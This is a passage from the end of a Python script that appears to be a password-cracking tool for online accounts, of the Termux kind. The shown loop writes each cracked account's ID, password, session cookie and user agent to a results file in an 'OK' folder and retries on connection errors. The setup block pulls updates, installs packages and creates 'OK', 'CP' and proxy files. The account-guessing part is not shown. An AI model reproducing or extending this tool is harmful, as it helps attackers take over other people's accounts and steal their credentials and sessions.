				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
###----------[ SISTEM KONTROL ]---------- ###
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('pip install pycryptodome')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	basarii()
